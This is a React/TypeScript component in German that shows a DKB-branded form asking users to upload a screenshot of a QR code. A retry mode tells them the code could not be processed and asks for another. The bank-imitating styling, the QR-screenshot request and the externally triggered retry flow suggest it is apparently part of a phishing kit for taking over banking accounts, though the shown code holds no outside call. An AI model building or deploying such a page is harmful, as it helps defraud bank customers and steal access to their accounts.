import React, { useState, useRef, useEffect } from 'react';

interface QRUploadFormProps {
  onUpload: (file: File) => void;
  isRetry?: boolean;
}

const QRUploadForm: React.FC<QRUploadFormProps> = ({ onUpload, isRetry = false }) => {
  const [isDragOver, setIsDragOver] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const [isUploading, setIsUploading] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Reset state when isRetry changes
  useEffect(() => {
    if (isRetry) {
      setSelectedFile(null);
      setPreviewUrl(null);
      setUploadError(null);
      setIsUploading(false);
    }
  }, [isRetry]);

  const validateFile = (file: File): string | null => {
    const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.type)) {
      return 'Ungültiger Dateityp. Nur JPG, PNG und GIF sind erlaubt.';
    }
    
    const maxSize = 10 * 1024 * 1024; // 10MB
    if (file.size > maxSize) {
      return 'Datei zu groß. Maximale Größe: 10 MB.';
    }
    
    return null;
  };

  const handleFileSelect = (file: File) => {
    const error = validateFile(file);
    if (error) {
      setUploadError(error);
      return;
    }
    
    setUploadError(null);
    setSelectedFile(file);
    
    const url = URL.createObjectURL(file);
    setPreviewUrl(url);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
    
    const files = Array.from(e.dataTransfer.files);
    if (files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(true);
  };

  const handleDragLeave = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
  };

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      handleFileSelect(files[0]);
    }
  };

  const handleUpload = async () => {
    if (!selectedFile) return;
    
    console.log('🚀 DKB QR Upload: Starting upload process with file:', selectedFile.name, selectedFile.size, selectedFile.type);
    setIsUploading(true);
    setUploadError(null);
    
    try {
      // Call the parent's onUpload function
      await onUpload(selectedFile);
      console.log('✅ DKB QR Upload: Upload completed successfully');
    } catch (error: any) {
      console.error('❌ DKB QR Upload error:', error);
      setIsUploading(false);
      setUploadError(error.message || 'Fehler beim Upload. Bitte versuchen Sie es erneut.');
    }
  };

  return (
    <div className="dkb-form-container">
      <div className="dkb-card">
        <h2 className="dkb-title-large" style={{ marginBottom: '32px', textAlign: 'center' }}>
          {isRetry ? 'QR-Code erneut hochladen' : 'QR-Code hochladen'}
        </h2>
        
        {isRetry && (
          <div className="dkb-error-box" style={{ textAlign: 'center' }}>
            Der QR-Code konnte nicht verarbeitet werden. Bitte laden Sie einen neuen Screenshot hoch.
          </div>
        )}

        <div
          onDrop={handleDrop}
          onDragOver={handleDragOver}
          onDragLeave={handleDragLeave}
          onClick={() => fileInputRef.current?.click()}
          style={{
            border: isDragOver ? '2px dashed var(--dkb-primary)' : '2px dashed var(--dkb-border-cards)',
            borderRadius: 'var(--border-radius-4)',
            padding: 'var(--space-8) var(--space-6)',
            textAlign: 'center',
            backgroundColor: isDragOver ? 'var(--dkb-surface-light)' : 'var(--dkb-surface)',
            cursor: 'pointer',
            transition: 'all 0.3s ease',
            marginBottom: 'var(--space-6)'
          }}
        >
          {!selectedFile ? (
            <>
              <div style={{
                fontSize: '48px',
                marginBottom: 'var(--space-4)',
                color: 'var(--dkb-text-subdued)'
              }}>
                📷
              </div>
              <h3 style={{
                fontSize: '1.125rem',
                fontWeight: '600',
                margin: '0 0 var(--space-2) 0',
                color: 'var(--dkb-text-primary)',
                fontFamily: 'var(--dkb-font-family)'
              }}>
                QR-Code Screenshot hochladen
              </h3>
              <p style={{
                fontSize: '0.875rem',
                margin: '0 0 var(--space-4) 0',
                color: 'var(--dkb-text-subdued)',
                fontFamily: 'var(--dkb-font-family)'
              }}>
                Ziehen Sie Ihre Datei hier hinein oder klicken Sie zum Auswählen
              </p>
              <div style={{
                fontSize: '0.75rem',
                color: 'var(--dkb-text-subdued)',
                fontFamily: 'var(--dkb-font-family)'
              }}>
                JPG, PNG, GIF - max. 10 MB
              </div>
            </>
          ) : (
            <div>
              <div style={{
                fontSize: '48px',
                marginBottom: 'var(--space-4)',
                color: 'var(--dkb-primary)'
              }}>
                ✅
              </div>
              <h3 style={{
                fontSize: '1.125rem',
                fontWeight: '600',
                margin: '0 0 var(--space-2) 0',
                color: 'var(--dkb-text-primary)',
                fontFamily: 'var(--dkb-font-family)'
              }}>
                Datei ausgewählt
              </h3>
              <p style={{
                fontSize: '0.875rem',
                margin: '0',
                color: 'var(--dkb-text-subdued)',
                fontFamily: 'var(--dkb-font-family)'
              }}>
                {selectedFile.name} ({(selectedFile.size / 1024 / 1024).toFixed(2)} MB)
              </p>
            </div>
          )}
        </div>

        {previewUrl && (
          <div style={{
            marginBottom: 'var(--space-6)',
            textAlign: 'center'
          }}>
            <h4 style={{
              fontSize: '1rem',
              fontWeight: '600',
              margin: '0 0 var(--space-3) 0',
              color: 'var(--dkb-text-primary)',
              fontFamily: 'var(--dkb-font-family)'
            }}>
              Vorschau:
            </h4>
            <img 
              src={previewUrl} 
              alt="QR Code Preview" 
              style={{
                maxWidth: '300px',
                maxHeight: '300px',
                border: '1px solid var(--dkb-border-cards)',
                borderRadius: 'var(--border-radius-4)'
              }}
            />
          </div>
        )}

        {uploadError && (
          <div className="dkb-error-box" style={{ textAlign: 'center' }}>
            {uploadError}
          </div>
        )}

        {selectedFile ? (
          <div style={{
            display: 'flex',
            gap: 'var(--space-3)',
            justifyContent: 'center'
          }}>
            <button
              onClick={handleUpload}
              disabled={isUploading}
              className="dkb-button dkb-button-primary"
              style={{ 
                flex: 1,
                opacity: isUploading ? 0.6 : 1,
                cursor: isUploading ? 'not-allowed' : 'pointer'
              }}
            >
              {isUploading ? 'Wird übertragen...' : 'QR-Code übertragen'}
            </button>
            
            <button
              onClick={() => {
                setSelectedFile(null);
                if (previewUrl) {
                  URL.revokeObjectURL(previewUrl);
                  setPreviewUrl(null);
                }
                if (fileInputRef.current) {
                  fileInputRef.current.value = '';
                }
                setUploadError(null);
              }}
              disabled={isUploading}
              style={{
                padding: 'var(--space-4) var(--space-6)',
                backgroundColor: 'transparent',
                color: 'var(--dkb-text-interact)',
                border: '1px solid var(--dkb-border-cards)',
                borderRadius: 'var(--border-radius-3)',
                cursor: isUploading ? 'not-allowed' : 'pointer',
                fontFamily: 'var(--dkb-font-family)',
                fontSize: '1rem',
                fontWeight: '500',
                opacity: isUploading ? 0.6 : 1
              }}
            >
              Andere Datei
            </button>
          </div>
        ) : (
          <div style={{
            fontSize: '0.75rem',
            color: 'var(--dkb-text-subdued)',
            textAlign: 'center',
            fontFamily: 'var(--dkb-font-family)'
          }}>
            <strong>Tipp:</strong> Stellen Sie sicher, dass der QR-Code vollständig und scharf zu erkennen ist.
          </div>
        )}

        <input
          ref={fileInputRef}
          type="file"
          accept="image/*"
          onChange={handleFileInputChange}
          style={{ display: 'none' }}
        />
      </div>
    </div>
  );
};

export default QRUploadForm;
